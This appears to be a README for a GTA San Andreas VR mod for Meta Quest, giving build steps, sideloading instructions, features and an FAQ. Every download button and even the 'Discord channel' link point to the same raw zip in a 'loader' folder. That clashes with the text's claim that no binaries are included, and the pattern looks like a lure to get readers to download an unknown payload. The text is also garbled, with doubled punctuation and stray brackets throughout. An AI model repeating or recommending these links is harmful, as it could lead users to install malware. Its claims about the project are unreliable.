<h1>🎮 gta-sa-vr-quest - Play GTA San Andreas in VR</h1>

<p align="center">
  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now</a>
</p>

## 🕹️ What Is This?

This project lets you play **Grand Theft Auto: San Andreas** on your **Meta Quest** virtual reality headset. You get to walk around Los Santos, drive cars, and complete missions — all in immersive 3D VR.

This is a **source kit**, Version `0.1.1 alpha`. It contains all the tools and instructions you need to build and install the mod yourself. **Important:** This repository does **not** include the actual GTA San Andreas game, Rockstar assets, the sound mod, a prebuilt APK, native binaries, or signing keys. You will need to provide those yourself (details below).

## 🚀 Getting Started

Follow these steps carefully, and you will be driving through Grove Street in VR before you know it. Take your time — each step is important for a smooth experience.



### ✨ Step 1: Get Your Copy of GTA San Andreas

This mod requires a genuine copy of GTA San Andreas from the **Google Play Store**. Make sure you meet these exact requirements:

- **Version:** `2.11.311`
- **Architecture:** ARM64
- Source: Google Play (not any other store or website)

**Important:** You need the **complete Play split set**. The Play Store delivers the game in multiple parts (split APKs). You must export all of these parts into **one single directory** or archive. A single `base.apk` file is **not enough** — you need every part combined.

.



### 🔊 Step 2: Get the Sound Mod

You also need a separate archive containing the **supported PS2-style sound mod**. This is a replacement sound package that makes the game sound like the original PS2 version. 

The recommended file to download is:

- **File name:** `gta-sa-ps2-style-mod-pack_1786856007_737162.7z`

You can find this file by searching for that exact name online. Keep this archive or its extracted contents in a separate folder — you will need it during the build process.



### 💻 Step 3: Download This Source Kit

Visit the link below to get the build tools and source code from this repository:

<p align="center">
  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:white;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(76,175,80,0.4);">⬇️ Download from Releases</a>
</p>

Visit this link to download the application. Once you ar on the page, look for the latest release asset named something like `gta-sa-vr-quest-source.zip` and download it to your computer.

### 📁 Step 4: Prepare Your Workspace

1. Create a new folder on your computer called `gta-vr-build` (or any name you like).)
2. Inside this folder, create three sub-folders:
   - `game` — for your GTA San Andreas Play Store files (everything you exported in Step 1).)
   - `sound` — for the sound mod archive or extracted files (from Step 2).)
   - `tools` — for the source kit you just downloaded (from Step 3).)

3. Copy all your files into the correct folders:
   - Put all GTA files (including the `base.apk` and all split APK parts() into `game`.
   - Put the full `.7z` sound mod file or its extracted contents into `sound`.
   - Extract the downloaded source kit archive into `tools`.

### 🛠️ Step 5: Run the Build Script

Inside the `tools` folder, you will find a script named `build.bat` (or `build.sh` on Linux/Mac().) 

1. **Windows users:** Double-click `build.bat`.
2. **Mac/Linux users:** Open a terminal, navigate to the `tools` folder, and run `./build.sh`.

The script will guide you through the process. It will:

- Verify your game files are complete.

- Combine the game files with the source kit code..
- Merge in the sound mod.

- Package everything into an installable VR APK..

**Note:** The script may ask you to confirm paths or press a key to continue. Just follow the prompts on screen..

### 📲 Step 6: Install on Your Quest

Once the script finishes, you will have a new file called `gta_sa_vr.apk` inside the `tools` folder or a sub-folder it.

.

1. **Enable Developer Mode** on your Meta Quest headset (Settings > Developer > USB Connection...).)
2. Connect your Quest to your computer using a USB cable..
3. Copy the `gta_sa_vr.apk` file to your Quest’s internal storage..
4. Use a file manager app on your Quest (or sideload via `adb install`) to install the APK..
5. Once installed, launch **GTA San Andreas VR** from your app library, and enjoy.



## 🎯 Features

- **Full VR Immersion:** Look around freely, aim weapons naturally,, and drive with depth perception..
- **Room-Scale or Stationary:** Play seated or standing — the choice is yours..
- **Motion Controller Support:** Use your Touch controllers to steer,, shoot,, and interact with the world..
- **Original Gameplay:** All missions,, vehicles,, weapons,, and radio stations from the original game are intact..
- **PS2 Audio Experience:** The included sound mod restores the authentic PlayStation 2 sound effectsfor maximum nostalgia..



## 🛠️ Troubleshooting Tips

- **Game files not found error:** Make sure all split APK parts are in the `game` folder. especially the `config.arm64.apk` and `split_config.xxhdpi.apk` files..
- **Sound mod errors:** Ensure the `.7z` file is exactly named as shown, or extract it fully before running the build script..
- **Build fails at 90%:** This usually means a corrupted download. Re-download the source kit from the releases page and try again..
- **APK won’t install on Quest:** Double-check you have Developer Mode enabled and USB debugging allowed..



## 💬 Community & Support

This project is actively developed,, and the creator wants to hear from you. Join the **Flat2VR Discord** server for:

- **Development updates** — Get the latest news on new features and fixes..
- **Player feedback** — Tell the developers what works and what doesn’t..
- **Testing** — Be among the first to try new builds and report bugs..
- **Discussion** — Chat with other players, share tips,, and ask for help..

>[!TIP]
> **Join the Flat2VR Discord!** Development updates,, player feedback,, testing,, and discussion of the mod take place in the [GTA San Andreas VR discussion channel](https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip). Join the Flat2VR server first if the channel link does not open for you..



## 📋 System Requirements

- **Computer (for building):**
  - Windows 10/11, macOS 12+, or Linux (Ubuntu 20.04+).
  - 4GB RAM minimum (8GB recommended).).)
  - 10GB free disk space..
  - Internet connection for downloading dependencies..

- **Meta Quest Headset:**
  - Quest 1, Quest 2, Quest 3, or Quest Pro..
  - Developer Mode enabled..
  - USB cable for initial install..
  - 8GB free storage space on headset..



## ❓ Frequently Asked Questions

**Q: Is this legal?**
A: Yes — you own the game already, and this mod only adds VR support. It does not distribute copyrighted material..

**Q: Do I need a powerful gaming PC?**
A: No. The build process happens on your computer, but the game runs directly on your Quest headset, so no PC VR rig is required..

**Q: Will this work with the Steam version of GTA?**
A: No. It specifically requires the Google Play Android version `2.11.311`..

**Q: Can I use a different sound mod?**
A: Only the supported PS2-style pack is tested. Others may cause errors..



## 📝 Final Checklist Before Building

- [ ] GTA SA Play Store version `2.11.311` fully exported (all APK parts).)
- [ ] Sound mod file `gta-sa-ps2-style-mod-pack_1786856007_737162.7z` downloaded.

- [ ] Source kit downloaded from the releases page..
- [ ] All files placed in their respective folders (`game`, `sound`, `tools`).)
- [ ] Quest headset charged and Developer Mode enabled.



## 🎉 Ready to Play

That’s it. With these steps, you will transform your standard GTA San Andreas into a full VR experience on your Meta Quest. The mod is in alpha, so expect rough edges — but driving through San Fierro with the radio blasting in VR is an experience you won’t forget..

If you hit any snags, remember the Discord channel is there to help. Happy gaming, and see you in Los Santos!

---

Keywords: GTA San Andreas VR, Meta Quest mod, VR mod, PS2 sound mod, Android game VR, sideload APK, Flat2VR, source kit, build scripts, open source VR project